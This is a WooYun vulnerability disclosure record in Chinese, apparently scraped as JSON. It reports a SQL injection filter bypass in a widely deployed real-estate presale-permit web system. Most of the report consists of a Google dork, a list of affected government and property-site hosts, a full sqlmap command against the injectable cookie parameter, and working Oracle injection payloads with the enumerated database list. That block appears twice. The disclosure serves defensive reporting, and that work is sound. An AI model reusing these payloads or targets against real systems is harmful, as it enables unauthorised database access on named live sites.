{"id": 41803, "wybug_id": "wooyun-2014-087616", "wybug_title": "某大量在用系统存在绕过SQL防注入保护漏洞", "wybug_corp": "西安必特思维软件有限公司", "wybug_author": "路人甲", "wybug_date": "2014-12-19 15:45", "wybug_open_date": "2015-03-19 15:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： dd 详细说明：  google:inurl:/xmlpzs/ysxkdetail.asp?permitsaleno=部分影响站点huangshanhouse.gov.cn/xmlpzs/ysxkdetail.aspwww.lzfg.com.cn/.../xmlpzs/ysxkdetail.asp219.154.46.179:8080/.../xmlpzs/ysxkdetail.aspwww.wnfdc.com/.../xmlpzs/ysxkdetail.aspwww.xnfcxx.com/.../xmlpzs/ysxkdetail.aspcx.lyfdc.gov.cn:5661/.../xmlpzs/ysxkdetail.asp222.91.146.2/bit.../xmlpzs/ysxkdetail.asp.............................Python sqlmap.py -u \"xxxx/xmlpzs/ysxkdetail.asp\" --cookie \"permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5\" --level 2Place: CookieParameter: permitsaleno    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5' AND 2975=2975 AND 'TIqv'='TIqv    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5' AND 9584=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(119)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (9584=9584) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(101)||CHR(110)||CHR(121)||CHR(113)||CHR(62))) FROM DUAL) AND 'hABG'='hABG    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: permitsaleno=-6036' UNION ALL SELECT CHR(113)||CHR(119)||CHR(118)||CHR(112)||CHR(113)||CHR(80)||CHR(76)||CHR(83)||CHR(75)||CHR(109)||CHR(101)||CHR(108)||CHR(85)||CHR(108)||CHR(65)||CHR(113)||CHR(101)||CHR(110)||CHR(121)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5' AND 7577=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(105)||CHR(118)||CHR(106),5) AND 'RCZI'='RCZI---web server operating system: Windows 2000web application technology: ASP, Microsoft IIS 5.0back-end DBMS: Oracleback-end DBMS: Oracleavailable databases [37]:[*] AESTATE_CONTRACT[*] AFS[*] AFSDIGITALSCAN[*] AFSDIGITALSCANIMG[*] APPRAISALINDUSTRYMGMT[*] ARCHIVE[*] BIMDIGITALSCAN[*] BROKERAGEINDUSTRYMGMT[*] CTXSYS[*] DBSNMP[*] DEVCREDITMGMT[*] DEVELOPMENT[*] DIGITALSCAN[*] DIGITALSCANIMG[*] DMSYS[*] DW_TT[*] EXFSYS[*] HALFPUBLICHOUSE[*] HOUSEPLATFORM[*] HPHDIGITALSCAN[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PB[*] PPDIGITALSCAN[*] PROPERTY[*] SMSCLIENT[*] SYS[*] SYSMAN[*] SYSTEM[*] TOUCH[*] TSMSYS[*] TT[*] WEBISSUE[*] WMSYS[*] XDB   漏洞证明：  Python sqlmap.py -u \"xxxx/xmlpzs/ysxkdetail.asp\" --cookie \"permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5\" --level 2Place: CookieParameter: permitsaleno    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5' AND 2975=2975 AND 'TIqv'='TIqv    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5' AND 9584=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(119)||CHR(118)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (9584=9584) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(101)||CHR(110)||CHR(121)||CHR(113)||CHR(62))) FROM DUAL) AND 'hABG'='hABG    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: permitsaleno=-6036' UNION ALL SELECT CHR(113)||CHR(119)||CHR(118)||CHR(112)||CHR(113)||CHR(80)||CHR(76)||CHR(83)||CHR(75)||CHR(109)||CHR(101)||CHR(108)||CHR(85)||CHR(108)||CHR(65)||CHR(113)||CHR(101)||CHR(110)||CHR(121)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: permitsaleno=%C1%D9%B7%BF%D4%A4%CA%DB%D7%D6%B5%DA2014366%BA%C5' AND 7577=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(105)||CHR(118)||CHR(106),5) AND 'RCZI'='RCZI---web server operating system: Windows 2000web application technology: ASP, Microsoft IIS 5.0back-end DBMS: Oracleback-end DBMS: Oracleavailable databases [37]:[*] AESTATE_CONTRACT[*] AFS[*] AFSDIGITALSCAN[*] AFSDIGITALSCANIMG[*] APPRAISALINDUSTRYMGMT[*] ARCHIVE[*] BIMDIGITALSCAN[*] BROKERAGEINDUSTRYMGMT[*] CTXSYS[*] DBSNMP[*] DEVCREDITMGMT[*] DEVELOPMENT[*] DIGITALSCAN[*] DIGITALSCANIMG[*] DMSYS[*] DW_TT[*] EXFSYS[*] HALFPUBLICHOUSE[*] HOUSEPLATFORM[*] HPHDIGITALSCAN[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PB[*] PPDIGITALSCAN[*] PROPERTY[*] SMSCLIENT[*] SYS[*] SYSMAN[*] SYSTEM[*] TOUCH[*] TSMSYS[*] TT[*] WEBISSUE[*] WMSYS[*] XDB   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-12-24 08:43 厂商回复： CNVD确认并复现所述情况,后续将按以往建立的联系渠道向软件生产厂商_西安必思特公司通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}